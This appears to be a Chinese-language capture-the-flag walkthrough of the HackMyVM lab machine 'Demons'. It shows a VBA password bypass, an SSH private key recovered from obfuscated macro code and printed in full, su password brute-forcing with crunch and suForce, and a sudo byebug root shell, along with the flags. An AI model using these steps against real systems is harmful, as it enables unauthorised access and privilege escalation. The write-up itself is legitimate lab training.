# Demons

2025.03.14 https://hackmyvm.eu/machines/machine.php?vm=Demons

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 可匿名登陆，下载了一个 mdb 文件，打开时有密码。经过查询，在 cyberchef 中将 DPB 为 DPX 可以绕过密码，然后就可以打开这个 access 文件，提示未知错误时不用管，直接点是，最后会打开 vba 的编辑窗口，点击模块->DemoNumberTwo->右键 DemoVBAMacro 属性->保护->设置一个密码->点击确定->再次点击左侧 DemoNumberTwo 就可以看到下面显示的 vba 代码。

其中可以看到宏定义的脚本文件，去除额外的字符串，得到了 ssh 私钥的信息：

```
Option Compare Database

Function KeyGood() As Boolean
    Dim KEY As String
    Dim NoKey As String

    KEY = "-----BEGIN OPENSSH PRI" + "VATE KEY-----"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "b3BlbnNzaC1rZXktdjEAAAAABG5vbm" + "UAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "NhAAAAAwEAAQAAAYEA3rTgKevGlujADq2" + "T3T9SEEeh5TEZ10Fi+uHNCTJksuwg6jMKguuL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "vq8OZAhRV0RazmzJASqayAlPEUh2dKQ" + "ctCOraBmzhDX0uhmG5twQsuSyERpLEixlw54RrT"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "J+SGcOQFJOCydnhnHKiQqNePEUoOdrO" + "3hBemlu4WSTzxaJZbaoxnC1XSzZ8ulYsTU4KcZL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6EoTARxVW7v+kP3lFr6zschqRfwrGTwh" + "7xeEj7PcZFVKuv1XzHWsAfiG/fxXpaVSM4PCqK"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "wvfsdjwZ6/ucuAOwSPFmpe6RRV2dDLF6q" + "wfvOsoMR6NttznX31dZWIXZgrAIdCSD3RtSk4"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "c+VDj5wu5okTxp6TVrp95DIjq9cdQfzjMJ" + "h9UL8bdEv+cBnEd0WJq4bfioQj19cDEdyDv1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6a6l5XsPjwYUv+lw6Bmj+a19jx/HC11O7VX" + "FGhXSFubLhcWPTx1RaIRLmQwg6B2du9CrcP"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "1Sctaaat3vSEKp+QbYk9IYmld3yrCTNvMhLV" + "INHhAAAFgMHGkD7BxpA+AAAAB3NzaC1yc2"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "EAAAGBAN604CnrxpbowA6tk90/UhBHoeUxGdd" + "BYvrhzQkyZLLsIOozCoLri76vDmQIUVdE"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "Ws5syQEqmsgJTxFIdnSkHLQjq2gZs4Q19LoZhu" + "bcELLkshEaSxIsZcOeEa0yfkhnDkBSTg"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "snZ4ZxyokKjXjxFKDnazt4QXppbuFkk88WiWW2q" + "MZwtV0s2fLpWLE1OCnGS+hKEwEcVVu7"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "/pD95Ra+s7HIakX8Kxk8Ie8XhI+z3GRVSrr9V8x1r" + "AH4hv38V6WlUjODwqisL37HY8Gev7"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "nLgDsEjxZqXukUVdnQ" + "yxeqsH7zrKDEejbbc5199XWViF2YKwCHQkg90bUpOHPlQ4+cLuaJ"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "E8aek1a6feQyI6vXHUH" + "84zCYfVC/G3RL/nAZxHdFiauG34qEI9fXAxHcg79emupeV7D48G"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "FL/pcOgZo/mtfY8fxwtdTu1VxRoV0hbmy4XFj0" + "8dUWiES5kMIOgdnbvQq3D9UnLWmmrd70"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "hCqfkG2JPSGJpXd8qwkzbzI" + "S1SDR4QAAAAMBAAEAAAGANIoNXDZwWke8j3npqUd377lGe1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "BzHTIizLcabPIDiaZlOXsjHrG8/RZFWdoQfnr0xUA" + "qx2iqrUhs69HhiDDzSJglpuBxVl54"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "RrMg/TOriNilHZ3LW" + "hU5SMXwu6Bu5FvTo98G5GC+bpxHwL7Jk1+kkzUlOhlrsRpQe0IEEN"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "XrQiCufmo2jy22mTTtpJi+kDRk0f8vrpJlnMek" + "DcaoFg6VS/rQ/4O3EzP5eXNd5Zz0AIOS"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "prx/yw9zrd9Y0XCH" + "qN9wLWJP+LWm8H7OBlWpwra5xnHMkQmclYwcaoWHSQNsqNdYuMuRGv"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "4WoYiSEhDoyVmlgoOy1EZGRPiGMRrFX" + "vpEyJgWCPV2+67NZYGO7fbBEh4x5N10HniLE281"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "ivsb2LmLWT9KeCCcSZOqZ/oX" + "nN08KFqgs5Qn8XdxqUwf0BN8zWZXldiunfKM7tjm0vmMtx"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "uwUEwZNw7PfKtwPs5LO+7Pri5" + "tqQAP7D5+czSODi29FO8KNY/sPyFxkmpgwjgc6YRxAAAA"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "wQClr++3HMtdgzOM+I8LCsEHXE" + "RG7xs1BUFbP7vCHMAdHAwN+vaZBzX0Vshc2IlwSSUmGL"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "6aQGDCQzMlWB9bdDl5gtof5N6Ng" + "xESwUuBPBnfo2BsyWcnpQv1lEvwlKvdM4mAa8DxSXYZ"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "d6jMPwkzHLS70I6KIm05LbGk6XbY" + "3Vu4L5+icVlQz4krc/e/oH/kD1EtYCa8hYq4t/NBJi"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "On0p22jatd/dI4rX1riPNhymmJNMQ+X" + "9PGbteXfwuR1sWFvNIAAADBAPN3tlgMQ5IXdzAj"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "AfLjsSfWPuzdUmDA7InNVoYnQpmTDxlu61d1W3e3V1onObXuOJ8nomvwecW9pbV2ScV/M/"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "mZFRvK4KJ9YV1IX2zMWxHzQXuOU3GtUe" + "VpXKNIwsZ1XI37QvCSlGGbdktoKVsoiks7aXet"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "pS2i5YRNTAQNopbGfhu/I1VJvRtvdffEn" + "tS/jd11NsCrnuoRyrIhehtZ6LXB9MX/xbNJcj"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "O7y0aRp60NQKzoDNrODeya5tubJW9mZ" + "QAAAMEA6iuVtgwh7wJwg9hMO+URme9tLJx4dB0i"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "sxzf78xa7tTw6U1H5Y4aq6zksvOZkxvEc" + "kaM3oTnBgqkJvrhlg+85v7R9eRF+7BrJ6PvZ1"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "2QQGAyEtV12zeUaHMukj2g6cP40BPS" + "IDFeBGYJmABsF6rDjUprg2BDirLMdvMQITFgLDky"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "uD0QYIewqUy1MSIRqjY+3EF/hM+9TW1" + "LACumsfjeqf8XuVbpI7i0EMU6Me3VGmyaAnJPbP"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"
    KEY = "v1x+/KC7YS6dfNAAAACmF" + "pbUBEZW1vbnM="
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"

    KEY = "-----END OPENSSH PR" + "IVATE KEY-----"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdasdadasdasdadassdasdasdasda"

End Function
```

将上述内容保存到 key 文件中

使用 shell 进行处理：

```bash
cat key |grep -v 'NoKey'|awk -F '"' '{print $2$4}' > id_rsa > id_rsa
chmod 600 id_rsa
```

对私钥进行 base64 解码，在最底部发现 aim@Demons，用户名是 aim ， ssh 使用私钥凭据进行登陆。

先拿到了 user flag：

```
aim@Demons:~$ cat user.txt
DemonsDontCry
```

发现图片 key8_8.jpg 传送至 kali 上，图片上的键盘有些按键是被涂鸦的，应该是提示 dfmno34 ，使用这个字符串作为基础生成字典，图片的文件名是 key8_8 好像是提示密码是 8 位：

```
crunch 8 8 dfmno34 -o pass
grep d3mon pass > pass.txt
```

然后再次爆破一下发现的另外一个用户 agares ， ssh 设置了只能私钥连接，只能在目标机器上尝试 su 切换。这里使用这个爆破程序 https://github.com/hemp3l/sucrack 或者这个 https://github.com/d4t4s3c/suForce/blob/main/suForce 传输到目标机器上：

```
./suForce.sh -u agares -w pass.txt
```

发现密码 d3monf4m 切换到 agares , sudo -l 显示 (ALL : ALL) /bin/byebug :

```
TF=$(mktemp); echo 'system("/bin/sh")' > $TF
sudo byebug $TF
continue
# cd /root
# ls
root.txt
# cat root.txt
inTheDark_BeAlone_OrLAst!
```
